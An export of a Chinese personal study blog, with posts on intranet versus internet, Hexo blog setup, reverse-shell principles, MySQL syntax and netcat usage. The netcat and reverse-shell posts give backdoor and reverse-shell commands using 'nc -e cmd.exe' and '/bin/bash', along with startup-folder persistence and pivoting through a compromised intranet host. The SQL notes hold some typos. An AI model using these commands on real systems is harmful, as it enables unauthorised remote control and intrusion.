    <title>内网与外网简介</title>
    <url>/2020/05/03/%E5%86%85%E7%BD%91%E4%B8%8E%E5%A4%96%E7%BD%91%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="内网与外网"><a href="#内网与外网" class="headerlink" title="内网与外网"></a>内网与外网</h1><p><a href="https://zhuanlan.zhihu.com/p/147282153">原文链接</a></p>
<h2 id="一、名词概念"><a href="#一、名词概念" class="headerlink" title="一、名词概念"></a>一、名词概念</h2><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><span id="more"></span>

<ul>
<li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li>
</ul>
<h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><ul>
<li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li>
</ul>
<h2 id="二、区别"><a href="#二、区别" class="headerlink" title="二、区别"></a>二、区别</h2><ol>
<li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li>
<li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li>
<li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li>
<li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建个人博客</title>
    <url>/2020/05/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="搭建静态页面个人博客"><a href="#搭建静态页面个人博客" class="headerlink" title="搭建静态页面个人博客"></a>搭建静态页面个人博客</h1><p><a href="https://www.jianshu.com/p/189fd945f38f">参考文献</a></p>
<p><a href="">参考文献</a></p>
<h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><ol>
<li><p>检查电脑是否有node.js</p>
<pre><code>node -v</code></pre><span id="more"></span>
</li>
<li><p>若没有则下载</p>
</li>
<li><p>安装npm</p>
<pre><code>npm install -g hexo-cli
这样会报错</code></pre></li>
</ol>
<h3 id="解决错误："><a href="#解决错误：" class="headerlink" title="解决错误："></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p>
<pre><code>mkdir ~/.npm-global</code></pre><p>设置npm全局包的安装路径:</p>
<pre><code>npm config set prefix &#39;~/.npm-global&#39;</code></pre><p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p>
<pre><code>export PATH=~/.npm-global/bin:$PATH</code></pre><p>回到终端运行以下命令, 让配置生效:</p>
<pre><code>source /etc/profile</code></pre><p>然后全局安装npm包就可以了.</p>
<p>[原文链<a href="https://blog.csdn.net/zhangxuekang/article/details/89075039">接</a></p>
<ol start="2">
<li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p>
<p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p>
</li>
<li><p>初始化博客框架</p>
</li>
</ol>
<pre><code># 选择一个地方新建博客目录
npx hexo init blog

# 生成博客文件夹中的moudle文件夹
npx hexo g

# 进行本机器运行测试
npx hexo server</code></pre><h3 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h3><ol>
<li><p>去hexo官网下载主题，克隆到自己的仓库下</p>
</li>
<li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p>
<p>并且更改语言设置成zh-CN</p>
</li>
<li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p>
</li>
</ol>
<h3 id="博客与github挂钩"><a href="#博客与github挂钩" class="headerlink" title="博客与github挂钩"></a>博客与github挂钩</h3><ol>
<li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p>
</li>
<li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p>
<pre><code>deploy:
    type: git
    repo: 仓库名称.git  (.git不能少)
    branch： master</code></pre></li>
<li><p>安装git部署插件</p>
<pre><code>npm install hexo-deployer-git --save</code></pre></li>
<li><p>之后</p>
<pre><code>npx hexo clean
npx hexo g
# 进行网站部署
npx hexo d</code></pre></li>
<li><p>大功告成</p>
</li>
</ol>
<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol>
<li><p>先去购买域名</p>
</li>
<li><p>进行域名注册</p>
</li>
<li><p>再进行域名解析（必要的环节）</p>
<ul>
<li>进入解析页面</li>
<li>添加解析</li>
<li>在命令行下ping自己的github和博客绑定的仓库</li>
<li>得到ip地址之后添加到解析列表</li>
</ul>
</li>
<li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p>
</li>
<li><p>进入blog，依次输入</p>
</li>
</ol>
<pre><code>   npx hexo clean
   npx hexo g
   hexo d</code></pre><ol start="6">
<li>大功告成.</li>
</ol>
<h3 id="hexo发生error-spawn-failed错误的解决方法"><a href="#hexo发生error-spawn-failed错误的解决方法" class="headerlink" title="hexo发生error:spawn failed错误的解决方法"></a>hexo发生error:spawn failed错误的解决方法</h3><ul>
<li><a href="https://blog.csdn.net/HTL2018/article/details/106876940">原文链接</a></li>
<li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li>
</ul>
<pre><code># 出现错误
error:spawn failed...
#解决方法
1. 删除blog文件夹中的 .deploy_git 文件夹
2. 输入 git config --global core.autocrlf false
3. 
    hexo clean
    hexo g
    hexo d
</code></pre>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/03/24/%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<hr>
<hr>
<h1 id="反弹shell原理"><a href="#反弹shell原理" class="headerlink" title="反弹shell原理"></a>反弹shell原理</h1><p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html">相关原文链接</a></p>
<h2 id="反弹shell定义"><a href="#反弹shell定义" class="headerlink" title="反弹shell定义"></a>反弹shell定义</h2><span id="more"></span>

<ul>
<li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li>
<li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li>
<li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li>
</ul>
<h2 id="反弹应用情景"><a href="#反弹应用情景" class="headerlink" title="反弹应用情景"></a>反弹应用情景</h2><ol>
<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>
<li>目标机器的ip动态改变，你不能持续控制。</li>
<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li>
<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>
</ol>
<h2 id="利用netcat进行反弹shell思路"><a href="#利用netcat进行反弹shell思路" class="headerlink" title="利用netcat进行反弹shell思路"></a>利用netcat进行反弹shell思路</h2><ul>
<li>注：只是想法，本人还未进行实践，未知可行性</li>
</ul>
<ol>
<li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li>
<li>将建立好的服务器放置于目标机器的开机自启文件夹中</li>
<li>在自己的机器上建立客户端，这样随时就可以访问了</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>数据库(二)</title>
    <url>/2021/03/24/%E6%95%B0%E6%8D%AE%E5%BA%93(%E4%BA%8C)/</url>
    <content><![CDATA[<h1 id="数据库（二）"><a href="#数据库（二）" class="headerlink" title="数据库（二）"></a>数据库（二）</h1><p><a href="https://www.bilibili.com/video/BV12b411K7Zu/?p=105">参考的相关视频资料连接</a></p>
<h2 id="DML语言"><a href="#DML语言" class="headerlink" title="DML语言"></a>DML语言</h2><ul>
<li>数据操作语言：<ul>
<li>插入：insert</li>
<li>修改：update</li>
<li>删除：delete</li>
</ul>
</li>
</ul>
<h3 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h3><h4 id="方式一：经典插入语句"><a href="#方式一：经典插入语句" class="headerlink" title="方式一：经典插入语句"></a>方式一：经典插入语句</h4><span id="more"></span>

<ul>
<li>语法</li>
</ul>
<pre><code>insert into 表名（列名1, 列名2, ...）
values （值1, 值2, ...）;</code></pre><ul>
<li>注意事项：<ol>
<li>插入的值的类型与列的类型一致或兼容</li>
<li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li>
<li>列的顺序可以调换，但是插入的值必须和列相匹配</li>
<li>列数和值得个数必须相一致</li>
<li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li>
</ol>
</li>
</ul>
<pre><code>insert into beauty
values(列1, 列2, ...);            //省略列名，默认所有列</code></pre><h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><ol>
<li>语法：</li>
</ol>
<pre><code>insert into 表名
set 列名1=值1，列名2=值2，...</code></pre><ol start="2">
<li>案例:</li>
</ol>
<pre><code>insert into beauty
set id=19, name=&#39;章子怡&#39;，phone=&#39;110&#39;;</code></pre><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol>
<li>方式一支持插入多行，方式二不行</li>
<li>方式一支持子查询，方式二不行</li>
</ol>
<h3 id="修改语句"><a href="#修改语句" class="headerlink" title="修改语句"></a>修改语句</h3><h4 id="修改单表的记录（-重点）"><a href="#修改单表的记录（-重点）" class="headerlink" title="修改单表的记录（*重点）"></a>修改单表的记录（*重点）</h4><ol>
<li>语法：</li>
</ol>
<pre><code>update 表名
set 列=新值，列=新值，...
where 筛选条件；</code></pre><ol start="2">
<li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li>
</ol>
<pre><code>update boys set boyname=&#39;张飞&#39;， usercp=10
where id=2;</code></pre><h4 id="修改多表得记录-了解即可"><a href="#修改多表得记录-了解即可" class="headerlink" title="修改多表得记录(了解即可)"></a>修改多表得记录(了解即可)</h4><ol>
<li>语法：</li>
</ol>
<pre><code>sql92语法：
update 表1 别名， 表2 别名
set 列=值，...
where 连接条件
and 筛选条件

sql99语法：
update 表1 别名
inner 连接类型 join 表2 别名
on 链接条件
set 列=值，...</code></pre><h3 id="删除语句"><a href="#删除语句" class="headerlink" title="删除语句"></a>删除语句</h3><ol>
<li>方式一：delete </li>
</ol>
<ul>
<li>删除整行</li>
<li>单表的删除</li>
</ul>
<pre><code>语法：
delete from 表名 where 筛选条件</code></pre><ul>
<li>案例：删除手机号以3结尾的女孩信息</li>
</ul>
<pre><code>delete from girls 
where phon like &#39;%3&#39;;</code></pre><ol start="2">
<li>方式二：truncate</li>
</ol>
<pre><code>语法：
truncate table 表名</code></pre><ul>
<li>案例：将魅力值&gt;100的男神信息删除</li>
</ul>
<pre><code>truncate table boys;</code></pre><h2 id="DDL语言"><a href="#DDL语言" class="headerlink" title="DDL语言"></a>DDL语言</h2><ol>
<li>DDL数据定义语言</li>
<li>表和库的管理</li>
</ol>
<h3 id="库的操作"><a href="#库的操作" class="headerlink" title="库的操作"></a>库的操作</h3><ol>
<li>库的创建</li>
</ol>
<ul>
<li>语法：</li>
</ul>
<pre><code>create database (if not exists)库名；</code></pre><ol start="2">
<li>库的删除</li>
</ol>
<ul>
<li>语法：</li>
</ul>
<pre><code>drop database if exists 库名；</code></pre><h3 id="表的管理"><a href="#表的管理" class="headerlink" title="表的管理"></a>表的管理</h3><ol>
<li>表的创建</li>
</ol>
<ul>
<li>语法：</li>
</ul>
<pre><code>create  table 表名(
    列名 列的类型【(长度) (约束)】，  //长度和约束可选
    列名 列的类型【(长度) (约束)】，
    ...
)；</code></pre><ul>
<li>案例：创建表Book</li>
</ul>
<pre><code>creat table book(
    id int, #编号
    bname varchar (20),  #图书名
    authorid int,  #作者编号
    publishdate datetime;  #出版日期
)；</code></pre><ol start="2">
<li>表的修改</li>
</ol>
<ul>
<li>语法：</li>
</ul>
<pre><code>alter table 表名 关键字 column 列名 列类型 约束</code></pre><ul>
<li>修改列名</li>
</ul>
<pre><code>//参考上个案例，创建表book
alter table book change aolumn publish pubdate datetime;</code></pre><ul>
<li>修改列的类型或约束</li>
</ul>
<pre><code>alter table book modify column pubtade timestamp;</code></pre><ul>
<li>添加新列</li>
</ul>
<pre><code>alter table author add column annual double;</code></pre><ul>
<li>删除列</li>
</ul>
<pre><code>alter table author drop column annual;</code></pre><ul>
<li>修改表名</li>
</ul>
<pre><code>alter table  author rename to book_author;</code></pre><ol start="3">
<li>表的删除</li>
</ol>
<ul>
<li>语法：</li>
</ul>
<pre><code>drop table if exists book_author;</code></pre><ul>
<li>通用的写法：</li>
</ul>
<pre><code>drop database if exists 旧库名；
create database 新库名；

drop table if exists 旧表名；
create table 表名（）；</code></pre><ol start="4">
<li>表的复制</li>
</ol>
<ul>
<li>复制表的结构</li>
</ul>
<pre><code>create table copy like author;</code></pre><ul>
<li>复制表的结构+数据</li>
</ul>
<pre><code>create table copy2
select * from author;</code></pre><ul>
<li>只复制部分数据</li>
</ul>
<pre><code>create table copy3
select id, au_name
from autor
where nation=&#39;中国&#39;；</code></pre><ul>
<li>复制部分结构</li>
</ul>
<pre><code>create table copy4
select id, au_name
from author
where 0;</code></pre><h3 id="常见的数据类型"><a href="#常见的数据类型" class="headerlink" title="常见的数据类型"></a>常见的数据类型</h3><pre><code>数值型：
        整型
        小数：
            定点型
            浮点型
字符型：
        较短的文本：char、varchar
        较长的文本：text，blob（较长的二进制数据）
日期型</code></pre><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><ol>
<li>分类：tinyint, smallint, mediumint, int\integer, bigint</li>
<li>特点：</li>
</ol>
<ul>
<li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li>
<li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li>
</ul>
<h4 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h4><ol>
<li>分类：</li>
</ol>
<ul>
<li>浮点型： float(M, D) , double(M, D)</li>
<li>定点型：dec(M, D) , decimal(M, D)</li>
</ul>
<ol start="2">
<li>特点：</li>
</ol>
<ul>
<li>M：整数部位+加小数部位的总长度</li>
<li>D：小数部位长度</li>
<li>如果超过范围，则插入临界值</li>
<li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li>
<li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li>
</ul>
<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p>
<ol>
<li>特点：</li>
</ol>
<pre><code>          写法        M的意思                      特点        空间的耗费    效率  
char     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高
varchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低</code></pre><h4 id="日期型"><a href="#日期型" class="headerlink" title="日期型"></a>日期型</h4><ol>
<li><p>分类：date 只保存日期</p>
<p>​            time 只保存时间</p>
<p>​            year 只保存年</p>
<p>​            datetime 保存日期+时间</p>
<p>​            timestamp 保存日期+时间</p>
</li>
<li><p>特点：</p>
</li>
</ol>
<pre><code>            字节   范围          时区等的影响
datetime     8    1000-9999         不受
timestamp    4    1970-2038          受</code></pre><h3 id="常见约束"><a href="#常见约束" class="headerlink" title="常见约束"></a>常见约束</h3><ol>
<li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p>
</li>
<li><p>分类：</p>
</li>
</ol>
<pre><code>1. not null: 非空用于保证该字段值不能为空
2. default： 默认，用于赋予该字段默认值
3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空
4. unique：用于保证该字段的值的唯一性
5. check：检查约束【MySQL中不支持】 
6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</code></pre><ol start="3">
<li>添加约束的时机：</li>
</ol>
<pre><code>1. 创建表时
2. 修改表时</code></pre><ol start="4">
<li>约束的添加分类：</li>
</ol>
<pre><code>1. 列级约束：
    直接在字段名和类型后面追加约束类型即可
    六大约束语法上都支持，但外键约束没有效果
2. 表级约束：
    在所有字段的最下面：constraint 约束名 约束类型（字段名）
    除了非空、默认约束，其他都支持</code></pre><ol start="5">
<li>主键与唯一：</li>
</ol>
<pre><code>        保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合
主键        Y                N            一个                允许，不推荐
唯一        Y                Y            多个                 允许，不推荐</code></pre><ol start="6">
<li>外键约束</li>
</ol>
<pre><code>1. 要求在从表中设置外键关系
2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求
3. 主表的关联列必须是一个key（一般是主键或唯一）
4. 插入数据时，先插入主表，再插入从表，删除时相反
# 添加外键约束：
alter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</code></pre><ol start="7">
<li>修改表时添加约束：</li>
</ol>
<pre><code>1. 添加列级约束：
alter table 表名 modify column 字段名 字段类型 新约束
2. 添加表级约束：
alter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</code></pre><ol start="8">
<li>修改表时删除约束：</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXJgK.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXJgK.png"></p>
<h3 id="标识列"><a href="#标识列" class="headerlink" title="标识列"></a>标识列</h3><ol>
<li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li>
<li>特点：</li>
</ol>
<pre><code>1. 标识列不一定要和主键搭配，但必须要和一个key搭配
2. 一个表至多只有一个标识列
3. 标识列的类型只能是数值型
4.标识列可以通过 set auto_increment_incremennt= ;设置步长
    可以通过手动插入值，设置起始值</code></pre><ol start="3">
<li>修改表时设置标识列</li>
</ol>
<pre><code>alter table 表名 modify column 字段值 类型 key名 auto_incerment;</code></pre><ol start="4">
<li>修改表时删除标识列</li>
</ol>
<pre><code>alter table 表名 modify column 字段值 类型；</code></pre><h2 id="TCL语言"><a href="#TCL语言" class="headerlink" title="TCL语言"></a>TCL语言</h2><ol>
<li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p>
</li>
<li><p>事务的特性</p>
</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXYjO.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXYjO.png"></p>
<ol start="3">
<li>事务的创建</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBX89x.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBX89x.png"></p>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXNuD.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXNuD.png"></p>
<ul>
<li>实例</li>
</ul>
<p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXG36.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXG36.png"></p>
<ol start="5">
<li>事务隔离级别</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200626215014414.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20200626215014414"></p>
<p><img "" class="lazyload placeholder" data-original="/home/blacksheep/%E5%9B%BE%E7%89%87/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E5%BA%93/image-20200627183401294.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20200627183401294"></p>
<ul>
<li>MySQL中默认隔离级别 repeatable read</li>
<li>oracle中默认级别 read committed</li>
<li>查看隔离级别 ：select @@tx_isolation;</li>
<li>设置隔离级别 ：</li>
</ul>
<pre><code>set session 或 global transaction isolation level 隔离级别；</code></pre><ol start="6">
<li>savepoint 节点名，设置保存点</li>
</ol>
<pre><code># 演示savepoint的使用
set autocommit = 0;
start transaction;
delete from account where id=25;
savepoint a;  #设置保存点
delete from account where id=28;
rollback to a;  #回滚到保存点

select * from account;

结果：id=28还在，id=25没有</code></pre>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>SQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>netcat使用</title>
    <url>/2020/10/20/%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80/</url>
    <content><![CDATA[<h2 id="netcat命令选项"><a href="#netcat命令选项" class="headerlink" title="netcat命令选项"></a>netcat命令选项</h2><h4 id="本文参考文章链接"><a href="#本文参考文章链接" class="headerlink" title="本文参考文章链接"></a>本文参考文章链接</h4><p><a href="https://www.fujieace.com/linux/nc-2.html">本文参考文章链接1</a></p>
<p><a href="https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html">本文参考文章链接2</a></p>
<p><a href="https://www.cnblogs.com/lpfuture/p/5719066.html">本文参考文章链接3</a></p>
<span id="more"></span>

<h3 id="常用命令选项"><a href="#常用命令选项" class="headerlink" title="常用命令选项"></a>常用命令选项</h3><pre><code>## 网络模式和代理相关
-l 监听，作服务器。不填时作客户端。
-u UDP模式。不填时默认TCP模式。
-X 和 -x 是代理相关的选项

## 其余常用选项
-v verbose模式，打印更多日志
-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性
-w 超时时间，单位是秒
-s 指定source addr
-p 指定source port
-n 只识别IP地址，不查询DNS
-k 处理完一个请求之后，继续监听下一个
-d 脱离命令行窗口，在后台运行，常用于后门建立的过程
-e 执行某个程序，常用于后门建立的过程
-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</code></pre><h3 id="基本全部命令选项"><a href="#基本全部命令选项" class="headerlink" title="基本全部命令选项"></a>基本全部命令选项</h3><pre><code>用法：

ncat [选项] [主机名] [端口]



花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。



-4    仅使用IPv4

-6    仅使用IPv6



-U, --unixsock 仅使用Unix域套接字

    --vsock 仅使用vsock套接字



-C, --crlf 将CRLF用于EOL序列

-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令

-e, --exec &lt;command&gt; 执行给定命令

    --lua-exec &lt;filename&gt; 执行给定的Lua脚本



-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）

-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）

-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接

-h, --help 显示此帮助屏幕

-d, --delay &lt;time&gt; 在读/写之间等待时间

-o, --output &lt;filename&gt; 将会话数据转储到文件中

-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中

-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间

-p, --source-port port 指定要使用的源端口

-s, --source addr 指定要使用的源地址（不影响-l）

-l, --listen 绑定并监听传入的连接

-k, --keep-open 在侦听模式下接受多个连接

-n, --nodns 不通过DNS解析主机名

-t, --telnet 回答Telnet协商

-u, --udp 使用UDP代替默认TCP

    --sctp 使用SCTP代替默认TCP



-v, --verbose 使用SCTP代替默认TCP

-w, --wait &lt;time&gt; 连接超时时间



-z   零I/O模式，仅报告连接状态

</code></pre><h2 id="1-模拟聊天"><a href="#1-模拟聊天" class="headerlink" title="1. 模拟聊天"></a>1. 模拟聊天</h2><ul>
<li>服务器</li>
</ul>
<pre><code>nc -l -p [端口号]</code></pre><ul>
<li>客户端</li>
</ul>
<pre><code>nc [服务器ip] [服务器端口]</code></pre><h2 id="2-Banner抓取方法"><a href="#2-Banner抓取方法" class="headerlink" title="2.Banner抓取方法"></a>2.Banner抓取方法</h2><ul>
<li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li>
</ul>
<pre><code>echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</code></pre><h2 id="3-文件传输"><a href="#3-文件传输" class="headerlink" title="3.文件传输"></a>3.文件传输</h2><h3 id="从客户端传输文件到服务器"><a href="#从客户端传输文件到服务器" class="headerlink" title="从客户端传输文件到服务器"></a>从客户端传输文件到服务器</h3><ul>
<li>服务器</li>
</ul>
<pre><code>nc -l -p [端口号] &gt; out_filename</code></pre><ul>
<li>客户端</li>
</ul>
<pre><code>nc [目标IP] [目标端口] &lt; in_flimename</code></pre><h3 id="从服务器传输文件到客户端"><a href="#从服务器传输文件到客户端" class="headerlink" title="从服务器传输文件到客户端"></a>从服务器传输文件到客户端</h3><ul>
<li>服务器</li>
</ul>
<pre><code>nc -l -p [端口号] &lt; in_filename</code></pre><ul>
<li>客户端</li>
</ul>
<pre><code>nc [目标IP] [目标端口] &gt; out_flimename</code></pre><h2 id="4-目录传输（与文件传输类似）"><a href="#4-目录传输（与文件传输类似）" class="headerlink" title="4.目录传输（与文件传输类似）"></a>4.目录传输（与文件传输类似）</h2><ul>
<li>服务器</li>
</ul>
<pre><code>tar -cvf - dir_name | nc -l [port_id]</code></pre><ul>
<li>客户端</li>
</ul>
<pre><code>nc -n [target_ip] [target_port] | tar -xvf - </code></pre><h2 id="5-windows建立后门的方法"><a href="#5-windows建立后门的方法" class="headerlink" title="5. windows建立后门的方法"></a>5. windows建立后门的方法</h2><h3 id="服务器——监听型后门"><a href="#服务器——监听型后门" class="headerlink" title="服务器——监听型后门"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e cmd.exe</code></pre><h3 id="客户端——连接型后门"><a href="#客户端——连接型后门" class="headerlink" title="客户端——连接型后门"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e cmd.exe</code></pre><h2 id="6、Linux下建立后门"><a href="#6、Linux下建立后门" class="headerlink" title="6、Linux下建立后门"></a>6、Linux下建立后门</h2><h3 id="服务器——监听型后门-1"><a href="#服务器——监听型后门-1" class="headerlink" title="服务器——监听型后门"></a>服务器——监听型后门</h3><pre><code>nc -l -p [port_id] -e /bin/bash</code></pre><h3 id="客户端——连接型后门-1"><a href="#客户端——连接型后门-1" class="headerlink" title="客户端——连接型后门"></a>客户端——连接型后门</h3><pre><code>nc [target_ip] [target_port] -e /bin/bash</code></pre><h2 id="7、连接转发"><a href="#7、连接转发" class="headerlink" title="7、连接转发"></a>7、连接转发</h2><ul>
<li>可以解决的问题</li>
</ul>
<ol>
<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li>
</ol>
<pre><code>&#39;&#39;&#39;
假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B
&#39;&#39;&#39;
# bat文件中的内容： nc [ip_B] [port_B]
A: nc -l -p [port_A] -e XX.bat
B: nc -l -p [port_B] 
C: nc [ip_A] [prt_A]</code></pre><ol start="2">
<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li>
</ol>
